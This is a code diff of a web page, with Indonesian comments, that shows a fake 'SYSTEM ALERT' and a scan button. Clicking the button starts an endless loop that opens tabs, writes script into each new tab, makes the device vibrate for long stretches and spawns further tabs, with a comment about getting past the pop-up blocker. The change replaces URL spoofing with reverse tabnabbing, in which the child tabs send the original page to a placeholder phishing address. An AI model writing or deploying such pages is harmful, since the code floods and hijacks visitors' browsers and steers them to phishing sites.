@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>One-Click Race Condition + URL Spoofing</title>
+<title>One-Click Race Condition + Reverse Tabnabbing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -20,7 +20,7 @@ button:disabled { background: #555; cursor: not-allowed; }
 <body>
 <div class="panel" id="main-panel">
     <h1>⚠️ SYSTEM ALERT</h1>
-    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (One-Click Race Condition).</p>
+    <p>Sistem mendeteksi anomali. Klik tombol di bawah untuk memulai (Race Condition + Reverse Tabnabbing).</p>
     
     <button id="start-btn" type="button">Mulai Pemindaian</button>
     
@@ -57,7 +57,7 @@ startBtn.addEventListener("click", function() {
     efekHacker();
 
     let dipicu = 0;
-    statusDiv.textContent = "Memicu One-Click Race Condition + Spoofing...";
+    statusDiv.textContent = "Memicu One-Click Race Condition...";
 
     // RACE CONDITION: Looping Tanpa Henti
     function picuTerusMenerus() {
@@ -69,7 +69,6 @@ startBtn.addEventListener("click", function() {
             // SUNTIKKAN KODE KE TAB BARU
             if (w) {
                 try {
-                    // Tulis HTML ke tab baru
                     w.document.write(`
                         <!DOCTYPE html>
                         <html>
@@ -81,11 +80,15 @@ startBtn.addEventListener("click", function() {
                                 <p id="status" style="color:#ff0; font-size:12px; margin-top:20px;">Memicu Race Condition...</p>
                             </div>
                             <script>
-                                // --- URL SPOOFING ---
-                                // Mencoba mengganti URL menjadi google.com
+                                // --- REVERSE TABNABBING ---
+                                // Membelokkan halaman utama (opener) ke situs lain
                                 try {
-                                    window.history.replaceState({}, '', 'https://google.com');
-                                } catch(e) {}
+                                    if (window.opener) {
+                                        window.opener.location.href = 'https://example.com/phishing';
+                                    }
+                                } catch(e) {
+                                    // Chrome modern memblokir akses lintas origin (tergantung pengaturan)
+                                }
 
                                 // Getar Sangat Lama (Looping di dalam tab baru)
                                 if (navigator.vibrate) {
@@ -115,7 +118,6 @@ startBtn.addEventListener("click", function() {
                                     } catch(e) {}
                                     
                                     document.getElementById('status').textContent = 'Membuka tab anak ke-' + dipicuAnak;
-                                    // Panggil terus menerus via microtask
                                     queueMicrotask(picuAnak);
                                 }
                                 // Jalankan Race Condition di tab anak setelah 1 detik
@@ -130,11 +132,11 @@ startBtn.addEventListener("click", function() {
             statusDiv.textContent = `Membuka tab utama ke-${dipicu}...`;
         } catch(e) {}
 
-        // Panggil dirinya sendiri via Microtask untuk bypass Pop-up Blocker di halaman utama
+        // Panggil dirinya sendiri via Microtask
         queueMicrotask(picuTerusMenerus);
     }
 
-    // Mulai Looping di halaman utama
+    // Mulai Looping
     queueMicrotask(function() {
         queueMicrotask(function() {
             picuTerusMenerus();
